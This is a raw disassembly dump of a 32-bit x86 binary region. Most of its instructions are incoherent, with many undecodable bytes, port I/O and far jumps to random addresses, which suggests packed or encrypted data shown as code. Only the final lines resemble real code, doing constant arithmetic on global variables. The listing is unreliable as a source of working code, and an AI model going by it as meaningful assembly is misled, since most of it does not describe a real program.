  406b03:	cmp    BYTE PTR [esi+0x0],al
  406b06:	bnd ret 0xe9e2
  406b0a:	sub    cl,BYTE PTR [eax-0x3f793ff7]
  406b10:	sar    BYTE PTR [eax-0x2d],0xd9
  406b14:	adc    DWORD PTR [ebx+0x2c9711bb],edx
  406b1a:	gs in  eax,dx
  406b1c:	and    ah,dh
  406b1e:	inc    ecx
  406b1f:	add    al,0xfa
  406b21:	aam    0x61
  406b23:	in     al,dx
  406b24:	sub    al,0xec
  406b26:	dec    ebx
  406b27:	mov    al,0x26
  406b29:	pop    ss
  406b2a:	in     al,0x97
  406b2c:	adc    DWORD PTR [ecx+0x7d],ecx
  406b2f:	cs pop es
  406b31:	scas   eax,DWORD PTR es:[edi]
  406b32:	jmp    0x406b4c
  406b34:	loop   0x406b1c
  406b36:	mov    ebp,0xd4f56747
  406b3b:	out    dx,eax
  406b3c:	jg     0x406b5a
  406b3e:	add    BYTE PTR [edi+ebp*4+0x7b],bh
  406b42:	test   DWORD PTR [ebp+0x3f],ecx
  406b45:	fist   WORD PTR fs:[eax+ebp*4+0x1c]
  406b4a:	ficomp DWORD PTR [ebx+eax*2+0x1771f872]
  406b51:	mov    al,dh
  406b53:	push   DWORD PTR [ecx]
  406b55:	es inc esp
  406b57:	mov    eax,0x5469e659
  406b5c:	push   ecx
  406b5d:	aas    
  406b5e:	pop    DWORD PTR [edi]
  406b60:	mov    ebp,0x6b5e6059
  406b65:	scas   al,BYTE PTR es:[edi]
  406b66:	ins    DWORD PTR es:[edi],dx
  406b67:	cmc    
  406b68:	frstor [eax-0x38]
  406b6b:	xchg   DWORD PTR [edx],esp
  406b6d:	std    
  406b6e:	stc    
  406b6f:	stos   DWORD PTR es:[edi],eax
  406b70:	je     0x406b63
  406b72:	dec    ebp
  406b73:	mov    ebx,ebx
  406b75:	aad    0x19
  406b77:	adc    cl,0xa1
  406b7a:	bound  esp,QWORD PTR [esi+0x6712d553]
  406b80:	or     DWORD PTR [ecx],eax
  406b82:	pop    ebx
  406b83:	(bad)  
  406b84:	mov    ebx,0xb415eea2
  406b89:	retf   0xf8
  406b8c:	jge    0x406b29
  406b8e:	mov    cl,BYTE PTR [ebx]
  406b90:	jg     0x406bc5
  406b92:	mov    esi,0x61d542c6
  406b97:	pop    ds
  406b98:	xor    BYTE PTR [ecx-0x33],dl
  406b9b:	cwde   
  406b9c:	sbb    ch,dl
  406b9e:	enter  0xff6a,0xaf
  406ba2:	(bad)  
  406ba3:	(bad)  
  406ba5:	cmp    DWORD PTR [eax-0x19b493fa],ecx
  406bab:	scas   al,BYTE PTR es:[edi]
  406bac:	sbb    ah,dh
  406bae:	adc    esi,esi
  406bb0:	or     esp,DWORD PTR [ecx-0x39]
  406bb3:	inc    edx
  406bb4:	out    0x14,eax
  406bb6:	cs sub al,0xd8
  406bb9:	pop    esi
  406bba:	adc    ch,al
  406bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bbd:	leave  
  406bbe:	js     0x406c35
  406bc0:	data16 daa 
  406bc2:	fldcw  WORD PTR [esi-0xc22391a]
  406bc8:	add    DWORD PTR [ecx+esi*4+0x95d5854],esp
  406bcf:	dec    ebp
  406bd0:	aas    
  406bd1:	pop    edx
  406bd2:	inc    edi
  406bd3:	ins    DWORD PTR es:[edi],dx
  406bd4:	mov    dh,0x2e
  406bd6:	gs inc esi
  406bd8:	dec    ebx
  406bd9:	popa   
  406bda:	jg     0x406bda
  406bdc:	add    ebp,ebp
  406bde:	ins    BYTE PTR es:[edi],dx
  406bdf:	pop    eax
  406be0:	mov    edx,DWORD PTR [ecx]
  406be2:	inc    edi
  406be3:	inc    ebp
  406be4:	fstp   TBYTE PTR [ecx-0x4da583f7]
  406bea:	cmp    eax,0x543ff125
  406bef:	dec    ebp
  406bf0:	cdq    
  406bf1:	and    BYTE PTR [edi+0x79499d63],ah
  406bf7:	test   eax,0x8aeaa031
  406bfc:	int    0x87
  406bfe:	push   eax
  406bff:	sub    al,0x17
  406c01:	mov    bl,0x52
  406c03:	loop   0x406bb4
  406c05:	rcr    BYTE PTR [ebp+edx*1+0x38d6bf01],cl
  406c0c:	test   BYTE PTR ds:0x27da263c,al
  406c12:	and    DWORD PTR [esi],eax
  406c14:	out    0x8f,al
  406c16:	xor    eax,DWORD PTR [ebx-0x55c2432]
  406c1c:	jg     0x406bdf
  406c1e:	popa   
  406c1f:	les    ecx,FWORD PTR [eax-0x16]
  406c22:	ret    0xeaf9
  406c25:	lock shl DWORD PTR [edx-0xcf65c56],1
  406c2c:	pop    ebx
  406c2d:	jge    0x406c5f
  406c2f:	push   0xffffffba
  406c31:	mov    ecx,ecx
  406c33:	fisttp DWORD PTR es:[edi+0x18c3258b]
  406c3a:	test   al,0x3c
  406c3c:	mov    ebx,0x8d0867cf
  406c41:	jmp    0x406bf9
  406c43:	or     al,BYTE PTR [eax]
  406c45:	loopne 0x406c8d
  406c47:	mov    al,0x70
  406c49:	mov    ebp,0x9bbe14a1
  406c4e:	adc    esp,edx
  406c50:	iret   
  406c51:	inc    ebp
  406c52:	xor    al,0x9
  406c54:	(bad)  
  406c55:	jecxz  0x406c7f
  406c57:	mov    edi,0x7bb78ba0
  406c5c:	adc    eax,0xff51ab0f
  406c61:	arpl   WORD PTR [edi-0x72caa2f2],di
  406c67:	bnd je 0x406cbd
  406c6a:	xor    DWORD PTR [esi-0x56],ebp
  406c6d:	ficom  WORD PTR [ebx+esi*8+0x6edd6e41]
  406c74:	lahf   
  406c75:	lods   al,BYTE PTR ds:[esi]
  406c76:	and    al,BYTE PTR [edi+0x28eb1633]
  406c7c:	sub    BYTE PTR [ebx],dl
  406c7e:	out    0xc7,eax
  406c80:	inc    eax
  406c81:	stos   DWORD PTR es:[edi],eax
  406c82:	test   BYTE PTR [edx-0x46566078],bh
  406c88:	sti    
  406c89:	in     al,dx
  406c8a:	mov    dl,0xb3
  406c8c:	jmpw   0x6ce4
  406c90:	xor    BYTE PTR [eax-0x11],dh
  406c93:	jmp    0xe798:0xb0da8196
  406c9a:	pop    ss
  406c9b:	push   eax
  406c9c:	sbb    al,0x4c
  406c9e:	hlt    
  406c9f:	pushf  
  406ca0:	pop    esi
  406ca1:	push   esp
  406ca2:	dec    ebp
  406ca3:	lea    esi,[edx-0x11993a4f]
  406ca9:	dec    edi
  406caa:	loope  0x406cea
  406cac:	neg    BYTE PTR [eax+0x2c6d6111]
  406cb2:	(bad)  
  406cb3:	xchg   ebp,eax
  406cb4:	push   0x4
  406cb6:	cmp    DWORD PTR [edx-0x2f2fa8cd],ebx
  406cbc:	push   ebp
  406cbd:	push   0xffffffeb
  406cbf:	jmp    0x406cca
  406cc1:	pusha  
  406cc2:	std    
  406cc3:	push   ds
  406cc4:	sbb    al,0x91
  406cc6:	push   esi
  406cc7:	cwde   
  406cc8:	loop   0x406cac
  406cca:	xchg   esi,eax
  406ccb:	out    0x15,eax
  406ccd:	xor    BYTE PTR [eax],0x10
  406cd0:	lods   eax,DWORD PTR ds:[esi]
  406cd1:	in     eax,0xbc
  406cd3:	mov    bl,0x68
  406cd5:	loope  0x406c95
  406cd7:	imul   esp,DWORD PTR [edx-0x37dd21ae],0xc27667dd
  406ce1:	data16 jnp 0x406cd7
  406ce4:	test   BYTE PTR [esi],0xd4
  406ce7:	test   DWORD PTR [bx+di-0x346b],edi
  406cec:	stc    
  406ced:	mov    edx,DWORD PTR [ebx-0x7b9d40ea]
  406cf3:	or     DWORD PTR [ebx+0x26],0xb1fe4064
  406cfa:	jo     0x406c8d
  406cfc:	neg    ah
  406cfe:	into   
  406cff:	iret   
  406d00:	jbe    0x406d78
  406d02:	mov    al,0x54
  406d04:	or     dl,ch
  406d06:	jbe    0x406d54
  406d08:	bswap  ecx
  406d0a:	icebp  
  406d0b:	fldcw  WORD PTR ds:0x4db681e1
  406d11:	mov    ebx,0x5c0ce632
  406d16:	jl     0x406d02
  406d18:	pop    esi
  406d19:	push   cs
  406d1a:	test   DWORD PTR [ebp+0x6e],edi
  406d1d:	jmp    0x9acf:0x645cdbb9
  406d24:	mov    cl,0xeb
  406d26:	aaa    
  406d27:	stos   BYTE PTR es:[edi],al
  406d28:	hlt    
  406d29:	neg    BYTE PTR [edx]
  406d2b:	add    al,0x8f
  406d2d:	iret   
  406d2e:	in     eax,dx
  406d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d30:	or     eax,DWORD PTR [ebp+0x5fef4379]
  406d36:	shr    DWORD PTR [ecx],0x49
  406d39:	stc    
  406d3a:	or     BYTE PTR [eax+0x28],dl
  406d3d:	shl    edx,cl
  406d3f:	xchg   ebp,esi
  406d41:	inc    esi
  406d42:	mov    al,ds:0xe453add7
  406d47:	pop    esi
  406d48:	jne    0x406d20
  406d4a:	in     eax,0x12
  406d4c:	int3   
  406d4d:	div    DWORD PTR [esi+ecx*2-0x13]
  406d51:	pop    esp
  406d52:	or     al,0xb6
  406d54:	xor    BYTE PTR [edi],ah
  406d56:	mov    al,ds:0x48231138
  406d5b:	xlat   BYTE PTR ds:[ebx]
  406d5c:	dec    BYTE PTR [edx-0x32]
  406d5f:	daa    
  406d60:	iret   
  406d61:	push   ebp
  406d62:	cdq    
  406d63:	mov    bl,BYTE PTR [ecx-0x25990431]
  406d69:	mov    ebp,0xe2ea336a
  406d6e:	pop    esp
  406d6f:	gs mov dl,0x11
  406d72:	cdq    
  406d73:	call   0x863f:0x9f4fb311
  406d7a:	popf   
  406d7b:	jmp    0x406d48
  406d7d:	cmp    esi,DWORD PTR [eax]
  406d7f:	xor    esi,ebx
  406d81:	aaa    
  406d82:	and    eax,0x60df2dac
  406d87:	xchg   ebp,eax
  406d88:	jbe    0x406d8b
  406d8a:	out    0x47,al
  406d8c:	sub    dl,BYTE PTR [esp+eiz*4]
  406d8f:	add    eax,DWORD PTR [edi-0x29761a4]
  406d95:	or     eax,0xf6098b7a
  406d9a:	jno    0x406d82
  406d9c:	iret   
  406d9d:	xchg   ebp,eax
  406d9e:	lods   eax,DWORD PTR ds:[esi]
  406d9f:	shl    BYTE PTR [edi],cl
  406da1:	call   0x2f2680f0
  406da6:	adc    eax,0x287b7c60
  406dab:	adc    BYTE PTR [ecx-0x53282604],ah
  406db1:	ins    DWORD PTR es:[edi],dx
  406db2:	rol    DWORD PTR [ecx+0x428b8e2],0x75
  406db9:	or     bh,bh
  406dbb:	ror    DWORD PTR [edi-0x40],cl
  406dbe:	xchg   ebx,eax
  406dbf:	inc    eax
  406dc0:	jl     0x406d42
  406dc2:	fadd   QWORD PTR [esi+esi*8-0x68]
  406dc6:	(bad)  
  406dc7:	mov    ebp,0xba8d6687
  406dcc:	inc    ecx
  406dcd:	sbb    BYTE PTR ds:0x1827f6f7,ah
  406dd3:	xchg   DWORD PTR [esi+0x52fa316b],edx
  406dd9:	mov    WORD PTR [eax-0x7f],es
  406ddc:	jbe    0x406d6f
  406dde:	pop    edi
  406ddf:	jge    0x406dfe
  406de1:	jnp    0x406dbf
  406de3:	mov    ebp,0x34fc42ac
  406de8:	mov    eax,ds:0x315aaf81
  406ded:	(bad)  
  406dee:	bound  eax,QWORD PTR [ecx-0x6a]
  406df1:	icebp  
  406df2:	adc    cl,BYTE PTR [eax+0x5e3299c8]
  406df8:	div    BYTE PTR cs:[ebx]
  406dfb:	iret   
  406dfc:	ret    
  406dfd:	dec    esi
  406dfe:	into   
  406dff:	xchg   edi,eax
  406e00:	out    0x10,al
  406e02:	xchg   ebp,eax
  406e03:	imul   DWORD PTR [ebp+0xc5dfa88]
  406e09:	cdq    
  406e0a:	aaa    
  406e0b:	push   ecx
  406e0c:	mov    bh,0xb6
  406e0e:	lock mov ebx,0xba81e522
  406e14:	dec    esp
  406e15:	dec    eax
  406e16:	fwait
  406e17:	jb     0x406e05
  406e19:	and    al,0xe4
  406e1b:	test   DWORD PTR [esi-0x5a],edx
  406e1e:	scas   al,BYTE PTR es:[edi]
  406e1f:	push   ebp
  406e20:	scas   al,BYTE PTR es:[edi]
  406e21:	cmp    eax,DWORD PTR ds:0xe18fbb42
  406e27:	xor    eax,esi
  406e29:	or     eax,DWORD PTR ds:0x1af63cfe
  406e2f:	add    DWORD PTR [ecx],0x1aa55b90
  406e35:	cwde   
  406e36:	cmp    eax,0x5b4ad091
  406e3b:	mov    al,0xbb
  406e3d:	dec    eax
  406e3e:	ins    DWORD PTR es:[edi],dx
  406e3f:	popf   
  406e40:	inc    edx
  406e41:	and    al,0x29
  406e43:	push   esi
  406e44:	ins    BYTE PTR es:[edi],dx
  406e45:	retf   0x22d0
  406e48:	bound  ebx,QWORD PTR [edx]
  406e4a:	lahf   
  406e4b:	test   eax,0x8cb0a312
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x434547,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax-0x325e2499]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e14
  406e7b:	add    BYTE PTR [ecx+0x65],ah
  406e7e:	sub    DWORD PTR [ecx-0x74],eax
  406e81:	retf   0x4929
  406e84:	jmp    0x3bb3:0x7c2a812d
  406e8b:	stos   BYTE PTR es:[edi],al
  406e8c:	and    cl,dh
  406e8e:	push   ecx
  406e8f:	repnz leave 
  406e91:	inc    esi
  406e92:	out    0x8a,al
  406e94:	je     0x406e19
  406e96:	cmc    
  406e97:	and    bh,bl
  406e99:	xchg   edx,eax
  406e9a:	loopne 0x406eba
  406e9c:	mov    edx,0xdb17c15b
  406ea1:	jmp    0xa7db:0xd5b742b
  406ea8:	mov    ds:0x7e5a648b,eax
  406ead:	pop    edi
  406eae:	ror    DWORD PTR ds:0x9c02ada0,1
  406eb4:	je     0x406ef1
  406eb6:	add    ebx,ebx
  406eb8:	int    0xa3
  406eba:	push   ecx
  406ebb:	icebp  
  406ebc:	xor    BYTE PTR [ebx+0x22],bh
  406ebf:	cmp    BYTE PTR [ebx],ch
  406ec1:	scas   al,BYTE PTR es:[edi]
  406ec2:	cmc    
  406ec3:	fidivr WORD PTR [eax+0x4b]
  406ec6:	or     eax,0xe112ae35
  406ecb:	sbb    dl,BYTE PTR [ebx+0x7]
  406ece:	(bad)  
  406ed0:	jo     0x406eeb
  406ed2:	aas    
  406ed3:	sub    esp,DWORD PTR [ebp*1-0x37e9e4a7]
  406eda:	sub    al,0x15
  406edc:	xchg   BYTE PTR [ebx],cl
  406ede:	or     esp,DWORD PTR [esi]
  406ee0:	xor    DWORD PTR [esp+ebx*8+0x526d44a7],edx
  406ee7:	sahf   
  406ee8:	mov    ebp,0x3ec9e28a
  406eed:	jnp    0x406eb7
  406eef:	test   ebp,ebx
  406ef1:	push   ecx
  406ef2:	push   edi
  406ef3:	push   edx
  406ef4:	dec    ebx
  406ef5:	sbb    eax,0x1ad783ba
  406efa:	jae    0x406e7c
  406efc:	jno    0x406f58
  406efe:	das    
  406eff:	jl     0x406ef1
  406f01:	(bad)  
  406f02:	jge    0x406f6e
  406f04:	pop    ebp
  406f05:	dec    eax
  406f06:	sub    al,0xa2
  406f08:	data16 lods al,BYTE PTR ds:[esi]
  406f0a:	jae    0x406eed
  406f0c:	and    al,0xd8
  406f0e:	dec    esi
  406f0f:	push   ebx
  406f10:	in     eax,dx
  406f11:	add    DWORD PTR [ebp-0x21],ebx
  406f14:	repz mov fs,ebx
  406f17:	fsubr  QWORD PTR [edx]
  406f19:	adc    BYTE PTR [edi],dl
  406f1b:	cmp    BYTE PTR [edx],dh
  406f1d:	mov    eax,ds:0x158a5aad
  406f22:	rol    BYTE PTR [eax],cl
  406f24:	js     0x406efe
  406f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f27:	mov    esp,0x9b54a65b
  406f2c:	cmp    eax,0xe235bb35
  406f31:	ret    
  406f32:	rcl    DWORD PTR [ebp+0x66],cl
  406f35:	sbb    BYTE PTR [esi+edx*1],0x47
  406f39:	lock adc bh,BYTE PTR [edi]
  406f3c:	and    ecx,DWORD PTR [esi+0x7e8372fb]
  406f42:	(bad)  
  406f43:	shr    ecx,1
  406f45:	add    DWORD PTR [ebx+0x2e],ebx
  406f48:	mov    ecx,0x39d04c2f
  406f4d:	fisttp QWORD PTR [edx+eiz*4+0x7f]
  406f51:	xor    DWORD PTR [edi+0x53a551f],eax
  406f57:	cmp    DWORD PTR [eax-0x68dd901a],eax
  406f5d:	jl     0x406f69
  406f5f:	lods   eax,DWORD PTR ds:[esi]
  406f60:	loopne 0x406ef3
  406f62:	xlat   BYTE PTR ds:[ebx]
  406f63:	push   ebx
  406f64:	inc    eax
  406f65:	les    edx,FWORD PTR [esi-0x2f]
  406f68:	pop    ss
  406f69:	mov    eax,0x8e3fcfbd
  406f6e:	add    BYTE PTR [ecx+0x2f],dl
  406f71:	jl     0x406f2f
  406f73:	inc    esp
  406f74:	push   ss
  406f75:	es mov ch,cl
  406f78:	ins    BYTE PTR es:[edi],dx
  406f79:	es jle 0x406fbf
  406f7c:	push   0xffffff8e
  406f7e:	fisttp QWORD PTR [edi]
  406f80:	scas   eax,DWORD PTR es:[edi]
  406f81:	pushf  
  406f82:	sbb    DWORD PTR [ebx+0x61bbc5e3],esi
  406f88:	cmp    al,BYTE PTR [eax+0x22b9fa0]
  406f8e:	daa    
  406f8f:	(bad)  
  406f90:	iret   
  406f91:	iret   
  406f92:	and    BYTE PTR [edi+eax*2],cl
  406f95:	xchg   DWORD PTR [esi+0x4d0b302c],esp
  406f9b:	push   esp
  406f9c:	jno    0x406f3f
  406f9e:	cmp    DWORD PTR [edx],edx
  406fa0:	in     eax,0xa5
  406fa2:	fild   DWORD PTR [ebx+0x4a]
  406fa5:	gs cmp ch,dl
  406fa8:	ret    
  406fa9:	pop    es
  406faa:	cmc    
  406fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fac:	repnz popa 
  406fae:	adc    ebx,DWORD PTR [edi-0x26]
  406fb1:	xchg   esp,eax
  406fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb3:	fdivr  DWORD PTR [ebx+0x60]
  406fb6:	mov    edi,0xe812797d
  406fbb:	mov    eax,ds:0x951ec65
  406fc0:	pop    es
  406fc1:	js     0x40703e
  406fc3:	mov    ecx,0x34d97b06
  406fc8:	add    al,0x8c
  406fca:	push   edx
  406fcb:	inc    edx
  406fcc:	bound  ecx,QWORD PTR [ebx-0x97bbe91]
  406fd2:	jl     0x406fee
  406fd4:	jmp    FWORD PTR [ebx+0x54e8ebd8]
  406fda:	inc    eax
  406fdb:	mov    ah,0x96
  406fdd:	retf   
  406fde:	push   esi
  406fdf:	or     al,0x2a
  406fe1:	mov    eax,0xd49f2412
  406fe6:	add    ah,BYTE PTR [esi-0x58]
  406fe9:	enter  0x2c7a,0x90
  406fed:	sar    ebx,1
  406fef:	inc    edi
  406ff0:	mov    edx,0x756731d2
  406ff5:	dec    esi
  406ff6:	int3   
  406ff7:	push   esi
  406ff8:	jmp    0x407076
  406ffa:	mov    ch,0xb4
  406ffc:	mov    esp,0x50583991
  407001:	add    BYTE PTR [edx-0x5b1a8d6c],dl
  407007:	pop    edi
  407008:	lahf   
  407009:	push   edi
  40700a:	push   ebp
  40700b:	mov    ecx,eax
  40700d:	and    BYTE PTR ds:0x2dc857df,al
  407013:	and    BYTE PTR [ecx+0x1b60b426],bl
  407019:	jnp    0x407032
  40701b:	add    edi,ebx
  40701d:	ja     0x40701c
  40701f:	mov    WORD PTR [edi],ss
  407021:	pushf  
  407022:	lods   eax,DWORD PTR ds:[esi]
  407023:	cmc    
  407024:	lock mov edx,0x82bc808c
  40702a:	cmp    al,0x55
  40702c:	scas   al,BYTE PTR es:[edi]
  40702d:	iret   
  40702e:	imul   ecx,DWORD PTR [ecx-0x7e441e39],0x37
  407035:	xchg   BYTE PTR [eax],bh
  407037:	dec    ecx
  407038:	ss cli 
  40703a:	clc    
  40703b:	cmp    al,BYTE PTR [esi+0x43]
  40703e:	lods   al,BYTE PTR ds:[esi]
  40703f:	out    0xac,al
  407041:	(bad)  
  407042:	mov    esi,0x7e94c9d2
  407047:	rol    DWORD PTR [ebp+0x20],1
  40704a:	or     BYTE PTR [esi],cl
  40704c:	dec    ecx
  40704d:	dec    ecx
  40704e:	push   es
  40704f:	mov    esp,0x7bef3ba
  407054:	jae    0x407079
  407056:	mov    bl,BYTE PTR [ecx]
  407058:	pop    edi
  407059:	inc    edi
  40705a:	pop    esi
  40705b:	xchg   edi,eax
  40705c:	mov    eax,0xac175e6
  407061:	js     0x406ff6
  407063:	push   ss
  407064:	mov    bh,0xa8
  407066:	repz push ds
  407068:	jecxz  0x407077
  40706a:	shl    DWORD PTR [ebp+0x118e09fc],0x89
  407071:	inc    ebx
  407072:	aam    0x28
  407074:	loop   0x407022
  407076:	sbb    eax,0x992922dd
  40707b:	push   ebx
  40707c:	fistp  WORD PTR [ecx-0x443f7c27]
  407082:	pop    edi
  407083:	call   0xc87b:0x507d8707
  40708a:	mov    ebp,0x369f759e
  40708f:	jnp    0x40707f
  407091:	inc    ebp
  407092:	mov    ds:0xa63f637b,al
  407097:	mov    esi,0xc2d35d2c
  40709c:	pushf  
  40709d:	icebp  
  40709e:	add    dh,bh
  4070a0:	jp     0x40709c
  4070a2:	(bad)  
  4070a4:	stos   DWORD PTR es:[edi],eax
  4070a5:	sbb    edx,DWORD PTR [ebx]
  4070a7:	xchg   edi,eax
  4070a8:	into   
  4070a9:	pusha  
  4070aa:	leave  
  4070ab:	dec    ecx
  4070ac:	and    ecx,ebx
  4070ae:	and    al,0xe
  4070b0:	test   BYTE PTR [ecx+0x24],0xe0
  4070b4:	push   edx
  4070b5:	in     al,dx
  4070b6:	pop    ecx
  4070b7:	pop    ebp
  4070b8:	call   0xc85e:0xad0b04ed
  4070bf:	idiv   DWORD PTR [ebx]
  4070c1:	sbb    cl,BYTE PTR [edx]
  4070c3:	push   edi
  4070c4:	sbb    DWORD PTR [edi],esi
  4070c6:	push   ecx
  4070c7:	jbe    0x407147
  4070c9:	loopne 0x40713a
  4070cb:	add    dh,BYTE PTR [ebx+0x45332451]
  4070d1:	mov    ds:0x13ddbf2c,al
  4070d6:	hlt    
  4070d7:	xchg   ebp,eax
  4070d8:	mov    ebp,fs
  4070da:	push   eax
  4070db:	lea    ecx,[esi-0x5f]
  4070de:	push   eax
  4070df:	imul   edi,DWORD PTR [esi+ebp*8-0x3b4ce419],0xffffffee
  4070e7:	xor    al,cl
  4070e9:	shl    dh,0x6a
  4070ec:	in     al,0x16
  4070ee:	pop    ss
  4070ef:	sbb    al,0x9a
  4070f1:	popf   
  4070f2:	and    cl,BYTE PTR [edi-0x45]
  4070f5:	cmp    BYTE PTR [ebx],ch
  4070f7:	or     edi,DWORD PTR [edi]
  4070f9:	enter  0xd05c,0x96
  4070fd:	push   ebx
  4070fe:	dec    ecx
  4070ff:	mov    ch,0x65
  407101:	cmp    ebp,esi
  407103:	fwait
  407104:	adc    ah,BYTE PTR gs:[esi-0x1f]
  407108:	repz sub eax,0x5d330046
  40710e:	or     al,0x73
  407110:	sbb    eax,ebx
  407112:	mov    eax,0xfd4c9455
  407117:	(bad)  
  407119:	mov    BYTE PTR [esi-0xa2296bf],ah
  40711f:	inc    esp
  407120:	retf   0xa507
  407123:	fisttp QWORD PTR [eax-0x152601b1]
  407129:	and    eax,esp
  40712b:	jmp    0x1d8f:0xd6f01a97
  407132:	jg     0x407184
  407134:	adc    eax,0xf228b65e
  407139:	jmp    0x407116
  40713b:	sbb    al,0xa1
  40713d:	jmp    0x3b14:0xa0d59a43
  407144:	pop    ebp
  407145:	push   0x4af3ee67
  40714a:	inc    esp
  40714b:	loop   0x4071b4
  40714d:	jl     0x40712a
  40714f:	daa    
  407150:	add    DWORD PTR [edx-0x1e],eax
  407153:	jbe    0x40713f
  407155:	lods   al,BYTE PTR ds:[esi]
  407156:	call   0x6a6b9112
  40715b:	data16 sbb BYTE PTR [ebx],cl
  40715e:	std    
  40715f:	fwait
  407160:	jno    0x4071b7
  407162:	jp     0x407154
  407164:	dec    edi
  407165:	pop    ebp
  407166:	dec    ebp
  407167:	fadd   DWORD PTR [eax-0x9628b1b]
  40716d:	pop    es
  40716e:	jle    0x407174
  407170:	jmp    0xbe37:0x1fef452d
  407177:	inc    edx
  407178:	xchg   esp,eax
  407179:	and    cl,BYTE PTR ds:0x813024f4
  40717f:	scas   eax,DWORD PTR es:[edi]
  407180:	daa    
  407181:	and    dl,ch
  407183:	mov    al,0x3e
  407185:	sbb    eax,0xf6e44e8d
  40718a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40718b:	aad    0x11
  40718d:	in     al,0xd1
  40718f:	push   edi
  407190:	call   0x1e81:0x29c52c78
  407197:	xchg   edx,eax
  407198:	ds mov esi,0xb13c82b7
  40719e:	in     al,dx
  40719f:	sbb    ecx,DWORD PTR ss:[ebx+0x2f]
  4071a3:	inc    BYTE PTR [ebx+eiz*2+0x0]
  4071a7:	mov    bl,0x77
  4071a9:	ja     0x4071ab
  4071ab:	dec    ebp
  4071ac:	jge    0x4071e1
  4071ae:	and    eax,0xb3edb3a2
  4071b3:	hlt    
  4071b4:	sub    al,BYTE PTR [edx-0x1d]
  4071b7:	fwait
  4071b8:	hlt    
  4071b9:	mov    dl,0xd2
  4071bb:	xor    ebx,DWORD PTR [esi]
  4071bd:	mov    bh,0xf0
  4071bf:	ret    0x255e
  4071c2:	xlat   BYTE PTR ds:[ebx]
  4071c3:	and    al,BYTE PTR [edx+eax*8]
  4071c6:	push   esp
  4071c7:	cld    
  4071c8:	dec    edi
  4071c9:	sbb    DWORD PTR [edx],ebp
  4071cb:	hlt    
  4071cc:	les    edx,FWORD PTR [edx-0x3]
  4071cf:	into   
  4071d0:	pop    esp
  4071d1:	xchg   edx,eax
  4071d2:	adc    eax,0x9ab9ab36
  4071d7:	lds    ecx,FWORD PTR [edi-0x7149f1c9]
  4071dd:	mov    eax,ds:0x486eff4
  4071e2:	test   al,0xbe
  4071e4:	jecxz  0x4071d5
  4071e6:	dec    edi
  4071e7:	jbe    0x40718f
  4071e9:	xlat   BYTE PTR ds:[ebx]
  4071ea:	iret   
  4071eb:	std    
  4071ec:	mov    bh,0x99
  4071ee:	ja     0x4071f3
  4071f0:	sbb    BYTE PTR [edx],0xca
  4071f3:	fstp   DWORD PTR [ebx+0x5a]
  4071f6:	jmp    0x40723f
  4071f8:	push   0x41
  4071fa:	aam    0x5a
  4071fc:	(bad)  
  4071fd:	sahf   
  4071fe:	jge    0x4071b2
  407200:	shl    DWORD PTR [esi+edx*2-0x6bf40315],1
  407207:	test   BYTE PTR [eax-0x79],0x33
  40720b:	clc    
  40720c:	or     BYTE PTR [ebx],0x58
  40720f:	stos   BYTE PTR es:[edi],al
  407210:	scas   al,BYTE PTR es:[edi]
  407211:	popa   
  407212:	clc    
  407213:	cmp    al,BYTE PTR [edi]
  407215:	nop
  407216:	ds pop edi
  407218:	stos   DWORD PTR es:[edi],eax
  407219:	ins    DWORD PTR es:[edi],dx
  40721a:	(bad)  
  40721b:	div    cl
  40721d:	fnsave [edi+0x13d76616]
  407223:	mov    bh,0x4
  407225:	clc    
  407226:	adc    edi,0x5f
  407229:	push   eax
  40722a:	xor    al,0x34
  40722c:	xchg   ecx,eax
  40722d:	imul   ecx,DWORD PTR [eax],0x4d
  407230:	shl    BYTE PTR [ecx],cl
  407232:	arpl   WORD PTR [ecx],bx
  407234:	jmp    0x8a84:0x9eedb99e
  40723b:	test   DWORD PTR [edi],eax
  40723d:	ins    DWORD PTR es:[edi],dx
  40723e:	int    0x42
  407240:	push   cs
  407241:	push   ss
  407242:	inc    edi
  407243:	jge    0x407225
  407245:	fldz   
  407247:	push   ebp
  407248:	sbb    BYTE PTR [ebx+ecx*4+0x39d445c7],0x4f
  407250:	add    BYTE PTR [eax],al
  407252:	mov    DWORD PTR ds:0x4344ef,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x4344df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434613,0x4344e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434507
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4344fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43454b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43453b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4345ef
  4072cc:	mov    eax,ds:0x434633
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
